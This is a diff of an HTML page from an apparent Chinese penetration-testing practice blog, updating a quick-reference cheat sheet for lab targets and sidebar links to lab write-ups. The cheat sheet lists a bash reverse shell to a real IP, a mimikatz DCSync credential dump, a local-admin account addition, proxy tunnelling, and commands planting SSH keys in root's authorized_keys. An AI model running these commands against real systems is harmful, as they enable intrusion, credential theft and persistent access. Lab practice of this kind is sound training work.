@@ -654,11 +654,13 @@
 <p>cs用这个shell免杀比较新<a target="_blank" rel="noopener" href="https://github.com/D13Xian/CobaltStrike-KunKun">https://github.com/D13Xian/CobaltStrike-KunKun</a></p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822192818100.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250822192818100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250822192818100"></p>
 <p>因为要jdk&gt;&#x3D;11，用这个切环境变量很爽<a target="_blank" rel="noopener" href="https://github.com/zhangqi-ulua/JavaEnvironmentVariablesManager/releases/tag/1.0">https://github.com/zhangqi-ulua/JavaEnvironmentVariablesManager/releases/tag/1.0</a></p>
-<h2 id="打靶快捷"><a href="#打靶快捷" class="headerlink" title="打靶快捷"></a>打靶快捷</h2><p>vps 117.72.74.197</p>
+<h2 id="打靶快捷"><a href="#打靶快捷" class="headerlink" title="打靶快捷"></a>打靶快捷</h2><p>tar -xzvf file.tar.gz</p>
+<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
+<p>vps 117.72.74.197</p>
 <p>花生壳 115.236.153.174</p>
 <p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;115.236.153.170&#x2F;28998 0&gt;&amp;1</p>
 <p>mimikatz dump密码：mimikatz.exe “lsadump::dcsync &#x2F;domain:xiaorang.lab &#x2F;all &#x2F;csv” exit</p>
-<p>bloodhound自己的zip有自己的SharpHound，最后连续收集两次拖进去（信息全一点</p>
+<p>bloodhound自己的zip有自己的SharpHound，连续收集两次拖进去（信息全一点</p>
 <p>本地adminstrators 用SharpHound抓不到，nt system才能抓到，可以甜土豆提权提到system</p>
 <h3 id="gost-代理"><a href="#gost-代理" class="headerlink" title="gost 代理"></a>gost 代理</h3><p>gost -L socks5:&#x2F;&#x2F;:5555?bind&#x3D;true</p>
 <p>gost -L rtcp:&#x2F;&#x2F;:2222&#x2F;172.22.13.28:22 -F socks5:&#x2F;&#x2F;172.22.13.28:5555</p>
@@ -666,7 +668,13 @@
 <p>net localgroup administrators godown &#x2F;add</p>
 <p>（work win qwerq!1234)</p>
 <h3 id="python转交互式shell"><a href="#python转交互式shell" class="headerlink" title="python转交互式shell"></a>python转交互式shell</h3><p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<h3 id="写ssh目录"><a href="#写ssh目录" class="headerlink" title="写ssh目录"></a>写ssh目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAyMKDIbTdKecWjhOxfm/C6bkR8WuABeqUAacyD8DJGfA7UaKQbvIZxagSrQ7X+jOPJYDwoe3HKoG0uH987EmsHMS1FLYgHIrGzinvta4AlMFCS3r8OF/49iGvcZnqxD5UNd9DRBlu4jIu6FDl+lYyebFDfjCoRn2hcin8oxXNLbo1X95B6xqaokrnFz9H57GzrqfwN6lVy46ophmtmcLqlIIMByt2wxEdaVFWrxHYVNmvMUfHOg9KJ+aqKmPIbLLSSknAeW7YOB1o86wq36vUv5nYQqol1mAlCtYYSJrNd2RRN43ikRqbQb4l5h1S1GJmYQ8hMJWhlia19waYGiSutKBjpVggEKS00Btku5xwStOraCOJqDiSNTQw//XjL/0oCeZtsrCLmPblgeLg1i7QBrTif3jQ+3UNC1DWj7+NXdmaEAeLWH1vVu7K0JzN3yMKM9ywoZQClGVv6F+aHS5HwxjKdCQPy86eG+rSmOy+RgpYjX4leqg3sb2a4Ys9oNt7/bQChABxnGfi8l48Su+nQhW1orks9sdZM9qhem90fkpqFDxt1pv6Q8J8C+8kIjXg/FmZ4qp8+d8InDqhhNbDLdAkQX1o9Iocg2XHSAtDNUHUZtNCT2AcmAH61qGkOHAe6dvXEVA9HRxF5oElnyAQ87z4Hbo2wW7CCPBbXNkjQIk= rsa 4096-20250810&quot;</span> &gt;&gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<h3 id="写ssh目录"><a href="#写ssh目录" class="headerlink" title="写ssh目录"></a>写ssh目录</h3><p>(轻薄本ssh)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAyMKDIbTdKecWjhOxfm/C6bkR8WuABeqUAacyD8DJGfA7UaKQbvIZxagSrQ7X+jOPJYDwoe3HKoG0uH987EmsHMS1FLYgHIrGzinvta4AlMFCS3r8OF/49iGvcZnqxD5UNd9DRBlu4jIu6FDl+lYyebFDfjCoRn2hcin8oxXNLbo1X95B6xqaokrnFz9H57GzrqfwN6lVy46ophmtmcLqlIIMByt2wxEdaVFWrxHYVNmvMUfHOg9KJ+aqKmPIbLLSSknAeW7YOB1o86wq36vUv5nYQqol1mAlCtYYSJrNd2RRN43ikRqbQb4l5h1S1GJmYQ8hMJWhlia19waYGiSutKBjpVggEKS00Btku5xwStOraCOJqDiSNTQw//XjL/0oCeZtsrCLmPblgeLg1i7QBrTif3jQ+3UNC1DWj7+NXdmaEAeLWH1vVu7K0JzN3yMKM9ywoZQClGVv6F+aHS5HwxjKdCQPy86eG+rSmOy+RgpYjX4leqg3sb2a4Ys9oNt7/bQChABxnGfi8l48Su+nQhW1orks9sdZM9qhem90fkpqFDxt1pv6Q8J8C+8kIjXg/FmZ4qp8+d8InDqhhNbDLdAkQX1o9Iocg2XHSAtDNUHUZtNCT2AcmAH61qGkOHAe6dvXEVA9HRxF5oElnyAQ87z4Hbo2wW7CCPBbXNkjQIk= rsa 4096-20250810&quot;</span> &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>(台式ssh)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzRv4K8C0ZKo/drmS5N3aJomFllWRGLoA7zQoXtePoLjg6dt2UHn6XQdwMpQkf82xYXrBBcXmaiYq377AOcTIhfTNc24u//27+fUwqSkrmGKIYYK2yZCIqWEbRySFj2FM/JJFOUKg7dYhWPQSR2IRGpPa6/a6vKta2LEcWvPFuUxw89oxP2AJLL6IQhw2yNNCz7X6AezByD+MljGTmA/tOmZJNJh95zMd71WJGjY9tXPCh/DilBumlG1lbBAC8GwscRR9jE6k24A2DIim7YWxUp0rXnWf+s1IM6YIO9ZDETCGVvHIFVl+tY50soC2CVTRqVQ4IPVQlBidCZy01PcqYQ==&quot;</span> &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+
 
 <h3 id="proxychains4"><a href="#proxychains4" class="headerlink" title="proxychains4"></a>proxychains4</h3><p>sudo vi &#x2F;etc&#x2F;proxychains4.conf</p>
 <p>socks5 192.168.1.100 1080</p>
@@ -1013,6 +1021,69 @@
             
 
             <div class="post-img-box">
+              <a href="/2025/10/14/chun-qiu-yun-jing-brute4road/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8173.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8173.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-14</span>
+                
+              </div>
+              <a class="post-title" href="/2025/10/14/chun-qiu-yun-jing-brute4road/">春秋云镜 Initial</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/10/13/chun-qiu-yun-jing-initial/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8172.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8172.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">10-13</span>
+                
+              </div>
+              <a class="post-title" href="/2025/10/13/chun-qiu-yun-jing-initial/">春秋云镜 Initial</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/09/15/chun-qiu-yun-jing-time/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">09-15</span>
+                
+              </div>
+              <a class="post-title" href="/2025/09/15/chun-qiu-yun-jing-time/">春秋云镜 Time</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
               <a href="/2025/08/28/lilctf/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
                 <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8169.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8169.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
@@ -1046,69 +1117,6 @@
                 
               </div>
               <a class="post-title" href="/2025/08/21/da-ba-bi-ji/">打靶笔记</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/08/21/chun-qiu-yun-jing-tsclient/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8171.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">08-21</span>
-                
-              </div>
-              <a class="post-title" href="/2025/08/21/chun-qiu-yun-jing-tsclient/">春秋云镜 Tsclient</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/08/14/chun-qiu-yun-jing-delivery/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8167.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8167.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">08-14</span>
-                
-              </div>
-              <a class="post-title" href="/2025/08/14/chun-qiu-yun-jing-delivery/">春秋云镜 delivery</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2025/08/07/chun-qiu-yun-jing-hospital/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8166.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8166.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">08-07</span>
-                
-              </div>
-              <a class="post-title" href="/2025/08/07/chun-qiu-yun-jing-hospital/">春秋云镜 hospital</a>
             </div>
           </div>
         
